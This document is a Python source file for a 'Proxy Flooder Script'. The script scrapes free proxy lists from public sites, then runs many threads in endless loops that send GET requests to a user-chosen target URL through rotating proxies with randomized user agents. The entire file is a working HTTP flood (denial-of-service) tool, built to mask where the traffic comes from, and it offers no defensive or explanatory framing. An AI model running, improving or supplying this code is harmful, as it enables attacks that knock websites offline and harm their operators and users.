import requests
from bs4 import BeautifulSoup
from itertools import cycle
import threading
import argparse
import random

class Colors:
    SUCCESS = '\033[92m'
    FAILURE = '\033[91m'
    INFO = '\033[93m'
    BANNER = '\033[94m'
    RESET = '\033[0m'

banner = f"""
{Colors.BANNER}
=======================================
    Proxy Flooder Script v1.0
    Created by Sheikh Nightshader
=======================================
{Colors.RESET}
"""

print(banner)

parser = argparse.ArgumentParser(description='Proxy Flooder Script')
parser.add_argument('--url', required=True, help='Target URL to flood. Example: http://example.com')
parser.add_argument('--threads', type=int, default=20, help='Number of threads to use (default: 20). Example: 10')
parser.add_argument('--timeout', type=int, default=2, help='Timeout for each request in seconds (default: 2). Example: 5')
parser.add_argument('--proxy-file', help='Path to a text file containing custom proxies (one per line). Example: proxies.txt')
args = parser.parse_args()

target_url = args.url
num_threads = args.threads
request_timeout = args.timeout
proxy_file = args.proxy_file

proxy_sources = [
    'https://www.sslproxies.org/',
    'https://free-proxy-list.net/',
    'https://www.us-proxy.org/',
    'https://www.socks-proxy.net/',
    'https://www.proxyscrape.com/free-proxy-list',
    'https://spys.one/en/free-proxy-list/',
    'https://hidemy.name/en/proxy-list/',
    'https://www.proxy-list.download/',
    'https://www.socks-proxy.net/',
    'https://www.proxynova.com/proxy-server-list/',
    'https://www.freeproxylists.net/',
    'https://www.globalproxy.io/free-proxy-list/',
    'https://www.proxies.io/proxies/',
]

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
]

def scrape_proxies():
    proxies = set()
    for source_url in proxy_sources:
        try:
            print(f"{Colors.INFO}Scraping proxies from {source_url}...{Colors.RESET}")
            response = requests.get(source_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            for row in soup.find_all('tr')[1:]:
                columns = row.find_all('td')
                if len(columns) >= 2:
                    ip = columns[0].text.strip()
                    port = columns[1].text.strip()
                    proxies.add(f"http://{ip}:{port}")
        except Exception as e:
            print(f"{Colors.FAILURE}Error scraping proxies from {source_url}: {e}{Colors.RESET}")
    
    return list(proxies)

def load_custom_proxies(file_path):
    try:
        with open(file_path, 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]
        print(f"{Colors.INFO}Loaded {len(proxies)} proxies from {file_path}{Colors.RESET}")
        return proxies
    except FileNotFoundError:
        print(f"{Colors.FAILURE}Error: The file {file_path} was not found.{Colors.RESET}")
        return []

def proxy_request(proxy):
    headers = {
        'User-Agent': random.choice(user_agents)
    }
    try:
        response = requests.get(target_url, proxies={'http': proxy, 'https': proxy}, headers=headers, timeout=request_timeout)
        if response.status_code == 200:
            print(f"{Colors.SUCCESS}Request sent through proxy: {proxy}, Status Code: {response.status_code}{Colors.RESET}")
    except requests.RequestException:
        pass

def flood_proxies(proxies):
    proxy_pool = cycle(proxies)
    while True:
        proxy = next(proxy_pool)
        proxy_request(proxy)

def main():
    print(f"{Colors.INFO}Target URL: {target_url}{Colors.RESET}")
    
    if proxy_file:
        proxies = load_custom_proxies(proxy_file)
    else:
        print(f"{Colors.INFO}Scraping proxies from multiple sources...{Colors.RESET}")
        proxies = scrape_proxies()
    
    if not proxies:
        print(f"{Colors.FAILURE}No proxies found. Please check the proxy sources or custom proxy file.{Colors.RESET}")
        return
    
    print(f"{Colors.INFO}Starting flood with {len(proxies)} proxies.{Colors.RESET}")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=flood_proxies, args=(proxies,))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print(f"{Colors.INFO}\nStopping flood...{Colors.RESET}")

if __name__ == "__main__":
    main()
